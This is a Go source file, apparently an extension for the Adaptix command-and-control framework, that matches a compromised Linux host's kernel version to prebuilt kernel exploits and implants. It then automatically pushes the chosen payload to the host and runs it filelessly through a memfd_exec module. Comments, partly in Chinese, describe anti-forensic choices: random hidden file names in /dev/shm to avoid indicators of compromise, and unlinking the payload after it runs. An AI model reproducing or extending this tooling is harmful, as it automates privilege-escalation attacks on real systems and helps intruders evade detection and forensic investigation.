// matrix_resolver.go — Phase 3: server-side auto-chain for the prebuilt
// matrix (check BOF output -> manifest lookup -> integrity -> autopush).
//
// The kernel_exploit_check BOF emits:
//   MATRIX:kver=<X.Y.Z>|btf=<0/1>|kconfig=<path-or-unknown>
// This resolver parses that line from BOF results, looks the target up in
// ~/cc/run/matrix/matrix_manifest.json (exact kver -> family fallback for
// ebpf/ko), verifies the artifact sha256, and (autopush) queues the
// download+execute chain as follow-up tasks.

package main

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand/v2"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"

	"github.com/vmihailenco/msgpack/v5"
	adaptix "github.com/Adaptix-Framework/axc2"
)

// MatrixEntry mirrors one manifest row: path -> {sha256, kver, arch, kind,
// feature}.
type MatrixEntry struct {
	Sha256  string `json:"sha256"`
	Path    string `json:"path"`
	Kver    string `json:"kver"`
	Arch    string `json:"arch"`
	Kind    string `json:"kind"`
	Feature string `json:"feature"`
}

type matrixResolver struct {
	mu        sync.RWMutex
	entries   map[string]MatrixEntry // path -> entry
	byKver    map[string][]MatrixEntry
	loaded    bool
	root      string
	moduleDir string
	autopush  bool
	lastError string
}

var gMatrix = &matrixResolver{autopush: true}

func (m *matrixResolver) Load(moduleDir string) error {
	// moduleDir is <run>/extenders/linux_agent; the matrix root is <run>/matrix.
	m.moduleDir = moduleDir
	m.root = filepath.Join(moduleDir, "..", "..", "matrix")
	manifestPath := filepath.Join(m.root, "matrix_manifest.json")
	raw, err := os.ReadFile(manifestPath)
	if err != nil {
		m.lastError = fmt.Sprintf("matrix manifest not found (%s): %v", manifestPath, err)
		return err
	}
	var rows map[string]MatrixEntry
	if err := json.Unmarshal(raw, &rows); err != nil {
		m.lastError = fmt.Sprintf("matrix manifest parse: %v", err)
		return err
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	m.entries = make(map[string]MatrixEntry, len(rows))
	m.byKver = make(map[string][]MatrixEntry)
	for path, e := range rows {
		e.Path = path
		m.entries[path] = e
		m.byKver[e.Kver] = append(m.byKver[e.Kver], e)
	}
	m.loaded = true
	return nil
}

// Resolve returns the best candidates for a MATRIX line, best first.
// Family fallback: for ebpf/ko with no exact kver match, entries whose kver
// prefix matches (same major.minor) are ranked below exact matches.
func (m *matrixResolver) Resolve(kver, arch string) []MatrixEntry {
	m.mu.RLock()
	defer m.mu.RUnlock()
	var exact, family, other []MatrixEntry
	majorMinor := kver
	if parts := strings.Split(kver, "."); len(parts) >= 2 {
		majorMinor = parts[0] + "." + parts[1]
	}
	for _, list := range m.byKver {
		for _, e := range list {
			if e.Arch != "" && e.Arch != arch {
				continue
			}
			switch {
			case e.Kver == kver:
				exact = append(exact, e)
			case e.Kver != "" && strings.HasPrefix(e.Kver, majorMinor):
				family = append(family, e)
			case e.Kver == "":
				other = append(other, e) // kernel-independent implants
			}
		}
	}
	sortEntries := func(s []MatrixEntry) {
		sort.Slice(s, func(i, j int) bool {
			return s[i].Path < s[j].Path
		})
	}
	sortEntries(exact)
	sortEntries(family)
	sortEntries(other)
	return append(append(exact, family...), other...)
}

// VerifyFile re-checks an artifact's sha256 against the manifest entry.
func (m *matrixResolver) VerifyFile(e MatrixEntry) error {
	f, err := os.Open(filepath.Join(m.root, e.Path))
	if err != nil {
		return err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return err
	}
	got := hex.EncodeToString(h.Sum(nil))
	if got != e.Sha256 {
		return fmt.Errorf("sha256 mismatch: manifest %s, file %s", e.Sha256, got)
	}
	return nil
}

// ParseMatrixLine extracts kver/btf/kconfig from a MATRIX: line.
func ParseMatrixLine(out string) (kver string, btf bool, kconfig string, ok bool) {
	for _, line := range strings.Split(out, "\n") {
		if !strings.HasPrefix(line, "MATRIX:") {
			continue
		}
		for _, kv := range strings.Split(strings.TrimPrefix(line, "MATRIX:"), "|") {
			switch {
			case strings.HasPrefix(kv, "kver="):
				kver = strings.TrimPrefix(kv, "kver=")
				ok = kver != ""
			case strings.HasPrefix(kv, "btf="):
				btf = strings.TrimPrefix(kv, "btf=") == "1"
			case strings.HasPrefix(kv, "kconfig="):
				kconfig = strings.TrimPrefix(kv, "kconfig=")
			}
		}
		return
	}
	return "", false, "", false
}

// maybeMatrixResolve — called from the BOF-result handling in ProcessData.
// When the output carries a MATRIX line and the resolver has a match, it
// logs the pick to the agent console and (autopush) queues the chain.
func maybeMatrixResolve(agentId, agentArch string, bofOutput string) {
	kver, btf, kconfig, ok := ParseMatrixLine(bofOutput)
	if !ok {
		return
	}
	if !gMatrix.loaded {
		Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_INFO,
			fmt.Sprintf("[matrix] resolver not loaded: %s", gMatrix.lastError), "", true)
		return
	}
	arch := agentArch
	if arch == "" {
		arch = "x86_64"
	}
	candidates := gMatrix.Resolve(kver, arch)
	if len(candidates) == 0 {
		Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_ERROR,
			fmt.Sprintf("[matrix] NO_MATCH kver=%s btf=%v kconfig=%s", kver, btf, kconfig), "", true)
		return
	}
	var best []string
	for _, e := range candidates {
		best = append(best, e.Path)
	}
	Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_SUCCESS,
		fmt.Sprintf("[matrix] MATCH kver=%s -> %d candidate(s): %s",
			kver, len(candidates), strings.Join(best[:min(3, len(best))], ", ")), "", true)

	pick := candidates[0]
	if err := gMatrix.VerifyFile(pick); err != nil {
		Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_ERROR,
			fmt.Sprintf("[matrix] integrity check failed for %s: %v", pick.Path, err), "", true)
		return
	}
	Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_SUCCESS,
		fmt.Sprintf("[matrix] verified %s (sha256 %s)", pick.Path, pick.Sha256[:16]), "", true)

	if !gMatrix.autopush {
		Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_INFO,
			"[matrix] autopush disabled — candidate list above; confirm manually", "", true)
		return
	}

	// Autopush: queue the upload+execute chain. Per-agent task queue is FIFO,
	// so pushing all upload chunks followed by the run task guarantees
	// run-after-upload ordering without callbacks.
	raw, err := os.ReadFile(filepath.Join(gMatrix.root, pick.Path))
	if err != nil {
		Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_ERROR,
			fmt.Sprintf("[matrix] autopush read failed for %s: %v", pick.Path, err), "", true)
		return
	}
	// 中转路径：tmpfs + 随机名 —— 消除 "/tmp/axm_<basename>" 这个固定前缀 IOC
	// （方案 §2 P1 / 完全体 A6）。/dev/shm 是 tmpfs：文件只存在于内存，断电即失，
	// 事后取证拿不到；"." 前缀让它不出现在默认 ls 里。task_upload 不会 mkdir 父
	// 目录，所以只能用已存在的目录。
	// （若某目标确实没有 /dev/shm，把前缀改回 "/tmp/" 即可 —— 随机名部分不变。）
	// 纵深防御：P0-2 的 --unlink 仍然生效，执行后这文件立刻消失。
	remotePath := fmt.Sprintf("/dev/shm/.m%08x", mrand.Uint32())
	const chunkSize = 256 * 1024
	// All chunks share one task key: the agent accumulates chunk content
	// per-key in memory and only writes the file on the Finish chunk.
	uploadKey := fmt.Sprintf("%08x", mrand.Uint32())
	chunks := 0
	for start := 0; start < len(raw); start += chunkSize {
		fin := start + chunkSize
		if fin > len(raw) {
			fin = len(raw)
		}
		params, _ := msgpack.Marshal(ParamsUpload{
			Task:    uploadKey,
			Path:    remotePath,
			Content: raw[start:fin],
			Finish:  fin >= len(raw),
		})
		cmd, _ := msgpack.Marshal(Command{Code: COMMAND_UPLOAD, Data: params})
		Ts.TsTaskCreate(agentId, "", "", adaptix.TaskData{
			Type:    adaptix.TASK_TYPE_TASK,
			AgentId: agentId,
			Sync:    true,
			TaskId:  fmt.Sprintf("%08x", mrand.Uint32()),
			Data:    cmd,
		})
		chunks++
	}
	Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_SUCCESS,
		fmt.Sprintf("[matrix] upload queued: %s (%d chunks, %d bytes) -> %s",
			pick.Path, chunks, len(raw), remotePath), "", true)

	// Execute step: memfd_exec BOF - synchronous in the agent command loop
	// (output lands directly in the task console) and fileless on the
	// target, matching how a real exploit chain would run. COMMAND_RUN was
	// rejected: its job thread needs the server-side job channel, which is
	// still a Phase-1 stub on both ends.
	bofPath := filepath.Join(gMatrix.moduleDir, "bofs", "memfd_exec.o")
	bofContent, err := os.ReadFile(bofPath)
	if err != nil {
		Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_ERROR,
			fmt.Sprintf("[matrix] memfd_exec.o unreadable (%s): %v", bofPath, err), "", true)
		return
	}
	// beacon-style packed args: 4-byte LE count + (4-byte LE length + token)*
	// Two tokens — the transit path and --unlink: memfd_exec unlinks the source
	// once the memfd holds the complete image (§3.2), so the tmpfs transit file
	// does not survive the run.  Order matters: unlink FIRST and a later
	// fexecve failure loses the payload; after the full write it cannot.
	unlinkTok := []byte("--unlink")
	argBuf := make([]byte, 8, 16+len(remotePath))
	binary.LittleEndian.PutUint32(argBuf, 2) // 2 packed args follow
	binary.LittleEndian.PutUint32(argBuf[4:], uint32(len(remotePath)))
	argBuf = append(argBuf, remotePath...)
	var lb [4]byte
	binary.LittleEndian.PutUint32(lb[:], uint32(len(unlinkTok)))
	argBuf = append(argBuf, lb[:]...)
	argBuf = append(argBuf, unlinkTok...)
	bofParams, _ := msgpack.Marshal(ParamsBof{
		Content:   bofContent,
		Args:      argBuf,
		EntryFunc: "go",
	})
	bofCmd, _ := msgpack.Marshal(Command{Code: COMMAND_EXEC_BOF, Data: bofParams})
	Ts.TsTaskCreate(agentId, "", "", adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentId,
		Sync:    true,
		TaskId:  fmt.Sprintf("%08x", mrand.Uint32()),
		Data:    bofCmd,
	})
	Ts.TsAgentConsoleOutput(agentId, adaptix.MESSAGE_SUCCESS,
		fmt.Sprintf("[matrix] execute queued: %s (memfd_exec)", remotePath), "", true)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
